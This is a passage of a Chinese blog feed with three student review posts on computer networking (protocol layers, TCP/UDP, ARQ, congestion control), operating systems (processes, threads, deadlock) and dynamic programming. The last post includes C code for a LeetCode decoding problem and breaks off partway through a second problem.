      <tag>堆栈溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>保研夏令营复习计划-计算机网络</title>
    <link href="/blog/2020/04/14/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/blog/2020/04/14/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<p><strong>计算机网络也是一门很重要的专业基础课，主要包含五层协议以及每层协议中不同的协议，协议作用与区别等。</strong></p><p><img src="/%5Cimages%5Cfj40.jpg"></p><span id="more"></span><h2 id="计算机网络层次模型"><a href="#计算机网络层次模型" class="headerlink" title="计算机网络层次模型"></a>计算机网络层次模型</h2><h3 id="OSI七层模型及TCP-x2F-IP五层协议"><a href="#OSI七层模型及TCP-x2F-IP五层协议" class="headerlink" title="OSI七层模型及TCP&#x2F;IP五层协议"></a>OSI七层模型及TCP&#x2F;IP五层协议</h3><p><img src="/%5Cimages%5Cosi.png"></p><p>下面简单说一下各层主要协议的特点及其应用。</p><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>应用层(application-layer）的任务是通过应用进程间的交互来完成特定网络应用。应用层协议定义的是应用进程（进程：主机中正在运行的程序）间的通信和交互的规则。对于不同的网络应用需要不同的应用层协议。在互联网中应用层协议很多，如域名系统DNS，支持万维网应用的 HTTP协议，支持电子邮件的 SMTP协议等等。我们把应用层交互的数据单元称为报文。</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层(transport layer)的主要任务就是负责向两台主机进程之间的通信提供通用的数据传输服务。应用进程利用该服务传送应用层报文。“通用的”是指并不针对某一个特定的网络应用，而是多种应用可以使用同一个运输层服务。由于一台主机可同时运行多个线程，因此运输层有复用和分用的功能。所谓复用就是指多个应用层进程可同时使用下面运输层的服务，分用和复用相反，是运输层把收到的信息分别交付上面应用层中的相应进程。<br>传输层主要使用以下两种协议：</p><ul><li>传输控制协议 TCP（Transmisson Control Protocol）–提供面向连接的，可靠的数据传输服务。</li><li>用户数据协议 UDP（User Datagram Protocol）–提供无连接的，尽最大努力的数据传输服务（不保证数据传输的可靠性）。</li></ul><h4 id="UDP-的主要特点"><a href="#UDP-的主要特点" class="headerlink" title="UDP 的主要特点"></a>UDP 的主要特点</h4><ol><li>UDP 是无连接的；</li><li>UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态（这里面有许多参数）；<br>UDP 是面向报文的；</li><li>UDP 没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如 直播，实时视频会议等）；</li><li>UDP 支持一对一、一对多、多对一和多对多的交互通信；</li><li>UDP 的首部开销小，只有8个字节，比TCP的20个字节的首部要短。</li></ol><h4 id="TCP-的主要特点"><a href="#TCP-的主要特点" class="headerlink" title="TCP 的主要特点"></a>TCP 的主要特点</h4><ol><li>TCP 是面向连接的。（就好像打电话一样，通话前需要先拨号建立连接，通话结束后要挂机释放连接）；</li><li>每一条 TCP 连接只能有两个端点，每一条TCP连接只能是点对点的（一对一）；</li><li>TCP 提供可靠交付的服务。通过TCP连接传送的数据，无差错、不丢失、不重复、并且按序到达；</li><li>TCP 提供全双工通信。TCP 允许通信双方的应用进程在任何时候都能发送数据。TCP 连接的两端都设有发送缓存和接收缓存，用来临时存放双方通信的数据；</li><li>面向字节流。TCP 中的“流”（Stream）指的是流入进程或从进程流出的字节序列。“面向字节流”的含义是：虽然应用程序和 TCP 的交互是一次一个数据块（大小不等），但 TCP 把应用程序交下来的数据仅仅看成是一连串的无结构的字节流。</li></ol><p>详情见：<a href="https://chujian521.github.io/blog/2018/09/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">计算机网络基本知识</a></p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>在 计算机网络中进行通信的两个计算机之间可能会经过很多个数据链路，也可能还要经过很多通信子网。网络层的任务就是选择合适的网间路由和交换结点， 确保数据及时传送。 在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组和包进行传送。在 TCP&#x2F;IP 体系结构中，由于网络层使用 IP 协议，因此分组也叫 IP 数据报 ，简称 数据报 packet。</p><p>路由器工作在网络层。</p><h4 id="常见路由协议及其区别"><a href="#常见路由协议及其区别" class="headerlink" title="常见路由协议及其区别"></a>常见路由协议及其区别</h4><p>常见的路由选择协议有：RIP协议、OSPF协议。<br>RIP协议：底层是贝尔曼福特算法，它选择路由的度量标准（metric)是跳数，最大跳数是15跳，如果大于15跳，它就会丢弃数据包。<br>OSPF协议：底层是迪杰斯特拉算法，是链路状态路由选择协议，它选择路由的度量标准是带宽，延迟。</p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>数据链路层(data link layer)通常简称为链路层。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议。 在两个相邻节点之间传送数据时，数据链路层将网络层交下来的 IP 数据报组装程帧，在两个相邻节点间的链路上传送帧。每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制等）。</p><p>网桥、交换机工作在数据链路层。</p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>在物理层上所传送的数据单位是比特。<br>物理层(physical layer)的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异。 使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。</p><p>中继器、集线器、网线是工作在物理层。</p><p><img src="/%5Cimages%5Cosi1.png"></p><h2 id="从发起http请求之后发生了什么？"><a href="#从发起http请求之后发生了什么？" class="headerlink" title="从发起http请求之后发生了什么？"></a>从发起http请求之后发生了什么？</h2><p>详见：<a href="https://chujian521.github.io/blog/2018/10/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%BA%8C%EF%BC%89/">计算机网络基础</a></p><h2 id="TCP如何保证可靠传输"><a href="#TCP如何保证可靠传输" class="headerlink" title="TCP如何保证可靠传输"></a>TCP如何保证可靠传输</h2><ul><li>应用数据被分割成 TCP 认为最适合发送的数据块。</li><li>TCP 给发送的每一个包进行编号，接收方对数据包进行排序，把有序数据传送给应用层。</li><li>校验和： TCP 将保持它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。</li><li>TCP 的接收端会丢弃重复的数据。</li><li>流量控制： TCP 连接的每一方都有固定大小的缓冲空间，TCP的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议。 （TCP 利用滑动窗口实现流量控制）</li><li>拥塞控制： 当网络拥塞时，减少数据的发送。</li><li>停止等待协议 也是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。 超时重传： 当 TCP 发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段。</li></ul><h3 id="停等ARQ"><a href="#停等ARQ" class="headerlink" title="停等ARQ"></a>停等ARQ</h3><ul><li>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组；</li><li>在停止等待协议中，若接收方收到重复分组，就丢弃该分组，但同时还要发送确认；</li></ul><ol><li>无差错情况:</li></ol><p><img src="/%5Cimages%5Carq1.png"></p><p>发送方发送分组,接收方在规定时间内收到,并且回复确认.发送方再次发送。</p><ol start="2"><li>出现差错情况（超时重传）:</li></ol><p><img src="/%5Cimages%5Carq2.png"></p><p>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重转时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为 自动重传请求 ARQ 。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。连续 ARQ 协议 可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。</p><ol start="3"><li>确认丢失和确认迟到</li></ol><p>确认丢失：确认消息在传输过程丢失</p><p><img src="/%5Cimages%5Carq3.png"></p><p>当A发送M1消息，B收到后，B向A发送了一个M1确认消息，但却在传输过程中丢失。而A并不知道，在超时计时过后，A重传M1消息，B再次收到该消息后采取以下两点措施：</p><ul><li>丢弃这个重复的M1消息，不向上层交付。</li><li>向A发送确认消息。（不会认为已经发送过了，就不再发送。A能重传，就证明B的确认消息丢失）。</li></ul><p>确认迟到 ：确认消息在传输过程中迟到</p><p><img src="/%5Cimages%5Carq4.png"></p><p>A发送M1消息，B收到并发送确认。在超时时间内没有收到确认消息，A重传M1消息，B仍然收到并继续发送确认消息（B收到了2份M1）。此时A收到了B第二次发送的确认消息。接着发送其他数据。过了一会，A收到了B第一次发送的对M1的确认消息（A也收到了2份确认消息）。处理如下：</p><ul><li>A收到重复的确认后，直接丢弃。</li><li>B收到重复的M1后，也直接丢弃重复的M1。</li></ul><h3 id="自动重传请求-ARQ-协议"><a href="#自动重传请求-ARQ-协议" class="headerlink" title="自动重传请求 ARQ 协议"></a>自动重传请求 ARQ 协议</h3><p>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重转时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为自动重传请求ARQ。<br><strong>优点：</strong> 简单<br><strong>缺点：</strong> 信道利用率低</p><h3 id="Go-Back-N"><a href="#Go-Back-N" class="headerlink" title="Go-Back-N"></a>Go-Back-N</h3><p>连续 ARQ 协议可提高信道利用率。发送方维持一个发送窗口，凡位于发送窗口内的分组可以连续发送出去，而不需要等待对方确认。接收方一般采用累计确认，对按序到达的最后一个分组发送确认，表明到这个分组为止的所有分组都已经正确收到了。<br><strong>优点：</strong> 信道利用率高，容易实现，即使确认丢失，也不必重传。<br><strong>缺点：</strong> 不能向发送方反映出接收方已经正确收到的所有分组的信息。 比如：发送方发送了 5条 消息，中间第三条丢失（3号），这时接收方只能对前两个发送确认。发送方无法知道后三个分组的下落，而只好把后三个全部重传一次</p><h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>TCP 利用滑动窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。</p><p><strong>滑动窗口：</strong></p><p>滑动窗口（Sliding window）是一种流量控制技术。早期的网络通信中，通信双方不会考虑网络的拥挤情况直接发送数据。由于大家不知道网络拥塞状况，同时发送数据，导致中间节点阻塞掉包，谁也发不了数据，所以就有了滑动窗口机制来解决此问题。<br>TCP 中采用滑动窗口来进行传输控制，滑动窗口的大小意味着接收方还有多大的缓冲区可以用于接收数据。发送方可以通过滑动窗口的大小来确定应该发送多少字节的数据。当滑动窗口为 0 时，发送方一般不能再发送数据报，但有两种情况除外，一种情况是可以发送紧急数据，例如，允许用户终止在远端机上的运行进程。另一种情况是发送方可以发送一个 1 字节的数据报来通知接收方重新声明它希望接收的下一字节及发送方的滑动窗口大小。</p><h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。<br>为了进行拥塞控制，TCP 发送方要维持一个 拥塞窗口(cwnd) 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。<br>TCP的拥塞控制采用了四种算法，即 慢开始 、 拥塞避免 、快重传 和 快恢复。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。</p><h4 id="慢开始"><a href="#慢开始" class="headerlink" title="慢开始"></a>慢开始</h4><p>慢开始算法的思路是当主机开始发送数据时，如果立即把大量数据字节注入到网络，那么可能会引起网络阻塞，因为现在还不知道网络的符合情况。经验表明，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是由小到大逐渐增大拥塞窗口数值。cwnd初始值为1，每经过一个传播轮次，cwnd加倍。拥塞避免算法的思路是让拥塞窗口cwnd缓慢增大，即每经过一个往返时间RTT就把发送放的cwnd加1。</p><h4 id="快重传与快恢复"><a href="#快重传与快恢复" class="headerlink" title="快重传与快恢复"></a>快重传与快恢复</h4><p>在 TCP&#x2F;IP 中，快速重传和恢复（fast retransmit and recovery，FRR）是一种拥塞控制算法，它能快速恢复丢失的数据包。没有 FRR，如果数据包丢失了，TCP 将会使用定时器来要求传输暂停。在暂停的这段时间内，没有新的或复制的数据包被发送。有了 FRR，如果接收机接收到一个不按顺序的数据段，它会立即给发送机发送一个重复确认。如果发送机接收到三个重复确认，它会假定确认件指出的数据段丢失了，并立即重传这些丢失的数据段。有了 FRR，就不会因为重传时要求的暂停被耽误。 　当有单独的数据包丢失时，快速重传和恢复（FRR）能最有效地工作。当有多个数据信息包在某一段很短的时间内丢失时，它则不能很有效地工作。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>保研夏令营复习计划-操作系统原理及安全</title>
    <link href="/blog/2020/04/07/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%89%E5%85%A8/"/>
    <url>/blog/2020/04/07/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>从今天开始复习专业课，准备保研夏令营的面试工作，复习一下专业课，争取能去个比较好的学校。</strong></p><p><img src="/images/fj39.jpg"></p><span id="more"></span><h2 id="0x00进程和线程概念及区别"><a href="#0x00进程和线程概念及区别" class="headerlink" title="0x00进程和线程概念及区别"></a>0x00进程和线程概念及区别</h2><h3 id="进程的概念"><a href="#进程的概念" class="headerlink" title="进程的概念"></a>进程的概念</h3><p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。</p><p>内存中的进程从高到低：栈-&gt;          &lt;-堆      数据     文本（代码）  </p><h3 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">就绪状态：进程已获得除处理机以外的所需资源，等待分配处理机资源；<br>运行状态：占用处理机资源运行，处于此状态的进程数小于等于<span class="hljs-meta">CPU</span>数；<br>阻塞状态： 进程等待某种条件，在条件满足之前无法执行；<br></code></pre></td></tr></table></figure><p><img src="/images/processstate.png"></p><h3 id="进程间的通信方式（IPC，进程间通信）"><a href="#进程间的通信方式（IPC，进程间通信）" class="headerlink" title="进程间的通信方式（IPC，进程间通信）"></a>进程间的通信方式（IPC，进程间通信）</h3><ol><li>管道（pipe）及命名管道（named pipe）：管道可用于具有亲缘关系的父子进程间的通信，有名管道除了具有管道所具有的功能外，它还允许无亲缘关系进程间的通信；</li><li>信号（signal）：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生；</li><li>消息队列：消息队列是消息的链接表，它克服了上两种通信方式中信号量有限的缺点，具有写权限得进程可以按照一定得规则向消息队列中添加新信息；对消息队列有读权限得进程则可以从消息队列中读取信息；</li><li>共享内存：可以说这是最有用的进程间通信方式。它使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据得更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等</li><li>信号量：主要作为进程之间及同一种进程的不同线程之间得同步和互斥手段；</li><li>套接字：这是一种更为一般得进程间通信机制，它可用于网络中不同机器之间的进程间通信，应用非常广泛。</li></ol><h3 id="进程控制块PCB"><a href="#进程控制块PCB" class="headerlink" title="进程控制块PCB"></a>进程控制块PCB</h3><p>包括以下内容：</p><ul><li>进程状态</li><li>程序计数器</li><li>CPU寄存器</li><li>CPU调度信息</li><li>内存管理信息</li><li>记账信息</li><li>I&#x2F;O状态信息</li></ul><h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>新的进程开始时处于就绪队列，它在就绪队列中等待直到被选中执行或被派遣。当进程分配到CPU并执行时，它可能发生以下几种事件的一种：</p><ul><li>进程可能发出一个I&#x2F;O请求，并被放到I&#x2F;O队列中。</li><li>进程可能创建一个新的子进程，并等待其结束。</li><li>进程可能会由于中断而强制释放CPU，并被放回到就绪队列</li></ul><p><img src="/images/processdiaodu.png"></p><h3 id="线程的概念"><a href="#线程的概念" class="headerlink" title="线程的概念"></a>线程的概念</h3><p>线程（英语：thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。在Unix System V及SunOS中也被称为轻量进程（lightweight processes），但轻量进程更多指内核线程（kernel thread），而把用户线程（user thread）称为线程。</p><p><img src="/images/threading.png"></p><h3 id="多线程模型"><a href="#多线程模型" class="headerlink" title="多线程模型"></a>多线程模型</h3><ul><li>多对一模型：多个用户线程对应一个内核线程，效率高但是如果有一个线程阻塞系统调用，那么整个进程会阻塞</li><li>一对一模型（多数）：将每个用户线程映射到一个内核线程，提供更好的并发功能，缺点就是每创建一个用户线程就要创建一个对应的内核线程，开销太大</li><li>多对多模型：多路复用了许多用户线程到同样数量或者更小数量的内核线程上</li></ul><h3 id="线程间通信"><a href="#线程间通信" class="headerlink" title="线程间通信"></a>线程间通信</h3><ol><li>互斥量 Synchronized&#x2F;Lock：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问</li><li>信号量 Semphare：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量</li><li>事件(信号)，Wait&#x2F;Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作</li></ol><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ul><li>进程是对运行时程序的封装，是系统进行资源调度和分配的的基本单位，实现了操作系统的并发；</li><li>线程是进程的子任务，是CPU调度和分派的基本单位，用于保证程序的 实时性，实现进程内部的并发；</li><li>一个程序至少有一个进程，一个进程至少有一个线程，线程依赖于进程而存在；</li><li>进程在执行过程中拥有独立的内存单元，而多个线程共享进程的内存。</li></ul><h2 id="0x01死锁及其成因"><a href="#0x01死锁及其成因" class="headerlink" title="0x01死锁及其成因"></a>0x01死锁及其成因</h2><h3 id="死锁的概念"><a href="#死锁的概念" class="headerlink" title="死锁的概念"></a>死锁的概念</h3><p>在两个或者多个并发进程中，如果每个进程持有某种资源而又等待其它进程释放它或它们现在保持着的资源，在未改变这种状态之前都不能向前推进，称这一组进程产生了死锁。通俗的讲，就是两个或多个进程无限期的阻塞、相互等待的一种状态。</p><h3 id="死锁产生的四个必要条件"><a href="#死锁产生的四个必要条件" class="headerlink" title="死锁产生的四个必要条件"></a>死锁产生的四个必要条件</h3><p>互斥：至少有一个资源必须属于非共享模式，即一次只能被一个进程使用；若其他申请使用该资源，那么申请进程必须等到该资源被释放为止；<br>占有且等待：一个进程因请求资源而阻塞时，对已获得的资源保持不放。<br>非抢占：进程已获得的资源，在末使用完之前，不能强行剥夺。<br>循环等待条件：若干进程之间形成一种头尾相接的循环等待资源关系。</p><h3 id="死锁解决的基本方法"><a href="#死锁解决的基本方法" class="headerlink" title="死锁解决的基本方法"></a>死锁解决的基本方法</h3><p>预防死锁、避免死锁、检测死锁、解除死锁 、鸵鸟策略 等</p><h2 id="0x02常见问题"><a href="#0x02常见问题" class="headerlink" title="0x02常见问题"></a>0x02常见问题</h2><h3 id="大端序和小端序的区别"><a href="#大端序和小端序的区别" class="headerlink" title="大端序和小端序的区别"></a>大端序和小端序的区别</h3><p><strong>小端字节序</strong>：低字节存于内存低地址；高字节存于内存高地址;</p><p><strong>大端字节序</strong>：高字节存于内存低地址；低字节存于内存高地址;</p><p>x86工作在小端序</p><h3 id="编译的流程"><a href="#编译的流程" class="headerlink" title="编译的流程"></a>编译的流程</h3><p>预处理</p><p>编译</p><p>汇编</p><p>链接</p><h3 id="堆和栈的区别"><a href="#堆和栈的区别" class="headerlink" title="堆和栈的区别"></a>堆和栈的区别</h3><h4 id="1-空间分配"><a href="#1-空间分配" class="headerlink" title="1.空间分配"></a>1.空间分配</h4><p>栈（操作系统）：由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。<br>堆（操作系统）： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收，分配方式倒是类似于链表</p><h4 id="2-缓存方式"><a href="#2-缓存方式" class="headerlink" title="2.缓存方式"></a>2.缓存方式</h4><p>栈使用的是一级缓存， 他们通常都是被调用时处于存储空间中，调用完毕立即释放。<br>堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定（并不是一旦成为孤儿对象就能被回收）。所以调用这些对象的速度要相对来得低一些。</p><h4 id="3-数据结构区别"><a href="#3-数据结构区别" class="headerlink" title="3.数据结构区别"></a>3.数据结构区别</h4><p>堆（数据结构）：堆可以被看成是一棵树，如：堆排序。<br>栈（数据结构）：一种先进后出的数据结构。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>算法练习-DP动态规划</title>
    <link href="/blog/2020/03/19/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-DP%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <url>/blog/2020/03/19/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-DP%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一下动态规划算法的应用与写法，准备机试进行时。</strong></p><p><img src="/images/fj38.jpg"></p><span id="more"></span><p><strong>动态规划</strong>（英语：Dynamic programming，简称 DP）是一种在数学、管理科学、计算机科学、经济学和生物信息学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。<br>动态规划常常适用于有重叠子问题和最优子结构性质的问题，动态规划方法所耗时间往往远少于朴素解法。<br>动态规划背后的基本思想非常简单。大致上，若要解一个给定问题，我们需要解其不同部分（即子问题），再根据子问题的解以得出原问题的解。动态规划往往用于优化递归问题，例如斐波那契数列，如果运用递归的方式来求解会重复计算很多相同的子问题，利用动态规划的思想可以减少计算量。<br>通常许多子问题非常相似，为此动态规划法试图仅仅解决每个子问题一次，具有天然剪枝的功能，从而减少计算量：一旦某个给定子问题的解已经算出，则将其记忆化存储，以便下次需要同一个子问题解之时直接查表。这种做法在重复子问题的数目关于输入的规模呈指数增长时特别有用</p><h2 id="1-解码方法"><a href="#1-解码方法" class="headerlink" title="1.解码方法"></a>1.解码方法</h2><h3 id="1-1题目描述"><a href="#1-1题目描述" class="headerlink" title="1.1题目描述"></a>1.1题目描述</h3><p>一条包含字母 A-Z 的消息通过以下方式进行了编码：<br>‘A’ -&gt; 1<br>‘B’ -&gt; 2<br>…<br>‘Z’ -&gt; 26<br>给定一个只包含数字的非空字符串，请计算解码方法的总数。<br>示例 1:<br>输入: “12”<br>输出: 2<br>解释: 它可以解码为 “AB”（1 2）或者 “L”（12）。<br>示例 2:<br>输入: “226”<br>输出: 3<br>解释: 它可以解码为 “BZ” (2 26), “VF” (22 6), 或者 “BBF” (2 2 6) 。</p><p>来源：<a href="https://leetcode-cn.com/problems/decode-ways/">https://leetcode-cn.com/problems/decode-ways/</a></p><h3 id="1-2思路"><a href="#1-2思路" class="headerlink" title="1.2思路"></a>1.2思路</h3><p>这个和青蛙跳台阶差不多思路，都是动态规划问题。如果字符串第一位就是0，出错，那么返回0即可。如果当前位置是0，向前查找上一个位置是不是1或者2，如果不是，编码出错，返回0，如果是，当前的结果数量就是上一次的数量。如果当前位置是1-6之间的数字，我们可以去判断上一个位置是不是1或2，如果是，当前结果数量，就是上一次的加上上次的，因为本次可以有跳一个和跳两个两种。然后更新pre的值。</p><h3 id="1-3代码"><a href="#1-3代码" class="headerlink" title="1.3代码"></a>1.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">numDecodings</span><span class="hljs-params">(<span class="hljs-type">char</span> * s)</span>&#123;<br>    <span class="hljs-keyword">if</span> (s[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span> || s[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> pre = <span class="hljs-number">1</span>, curr = <span class="hljs-number">1</span>;<span class="hljs-comment">//dp[-1] = dp[0] = 1</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; s[i] != <span class="hljs-number">0</span>; i++) &#123;<br>        <span class="hljs-type">int</span> tmp = curr;<br>        <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;0&#x27;</span>)<br>            <span class="hljs-keyword">if</span> (s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span> || s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;2&#x27;</span>) <br>                curr = pre; <span class="hljs-comment">//dp[i] = dp[i-2]</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// error</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span> || (s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;2&#x27;</span> &amp;&amp; s[i] &gt;= <span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; s[i] &lt;= <span class="hljs-string">&#x27;6&#x27;</span>))<br>            curr = curr + pre;  <span class="hljs-comment">// dp[i] = dp[i-1] + dp[i-2]</span><br>        pre = tmp;  <span class="hljs-comment">// next dp[i-2] = dp[i-1] </span><br>    &#125;<br>    <span class="hljs-keyword">return</span> curr;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="2-最长回文子串"><a href="#2-最长回文子串" class="headerlink" title="2.最长回文子串"></a>2.最长回文子串</h2><h3 id="2-1题目描述"><a href="#2-1题目描述" class="headerlink" title="2.1题目描述"></a>2.1题目描述</h3><p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。<br>示例 1：<br>输入: “babad”<br>输出: “bab”<br>注意: “aba” 也是一个有效答案。<br>示例 2：<br>输入: “cbbd”<br>输出: “bb”</p><p>来源：<a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">https://leetcode-cn.com/problems/longest-palindromic-substring/</a></p><h3 id="2-2思路"><a href="#2-2思路" class="headerlink" title="2.2思路"></a>2.2思路</h3><p>第一想法就是直接暴力搜索，分偶数长度和奇数长度回文字符串，直接尝试保存目前最长的回文子串即可。</p><h3 id="2-3代码"><a href="#2-3代码" class="headerlink" title="2.3代码"></a>2.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 